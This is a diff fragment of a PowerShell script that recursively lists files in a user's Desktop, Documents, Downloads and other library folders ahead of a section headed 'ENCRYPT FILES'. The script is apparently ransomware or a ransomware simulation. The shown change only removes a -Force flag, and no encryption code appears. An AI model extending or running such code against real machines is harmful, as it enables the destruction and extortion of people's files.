@@ -35,7 +35,7 @@ $libraries = "Desktop","Documents","Downloads","Music","OneDrive","Pictures","Vi
 Foreach ($library in $libraries){
 #Get files from path recursively
 #$files = Get-ChildItem -Path "$path\$library\*" -Force -Recurse -Include *.txt, *.docx, *.xlsx, *.pptx, *.ppsx, *.png, *.tiff, *.jpg, *.jpeg, *.wav, *.mp3
-$files = Get-ChildItem -Path "$path\$library\*" -Force -Recurse -Exclude desktop.ini
+$files = Get-ChildItem -Path "$path\$library\*" -Recurse -Exclude desktop.ini
 
 ###################
 ## ENCRYPT FILES ##
